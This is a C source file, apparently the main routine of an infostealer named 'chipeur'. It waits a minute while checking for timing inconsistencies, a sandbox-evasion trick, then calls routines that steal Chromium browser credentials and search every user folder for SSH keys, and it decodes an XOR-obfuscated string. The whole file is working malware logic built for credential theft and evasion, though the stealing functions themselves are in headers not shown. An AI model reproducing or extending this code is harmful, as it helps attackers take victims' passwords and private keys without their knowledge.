#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include "chromium.h"
#include "delay_execution.h"
#include "find_ssh_key.h"
#include "obfuscation.h"

void hello(void) { printf("Hello World\n"); }

int main(void) {
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);

  // 1 minute
  if (delay_execution(60000) == EXIT_FAILURE) {
#ifdef DEBUG
    fprintf(stderr, "Timing inconsistencies while delaying execution");
#endif
    return EXIT_FAILURE;
  }

  hello();
  steal_chromium_creds();
  find_ssh_key(L"C:\\Users");

  char str[] = "BOFFE";
  xor_str(str, strlen(str));
  printf("%s", str);

  return EXIT_SUCCESS;
}
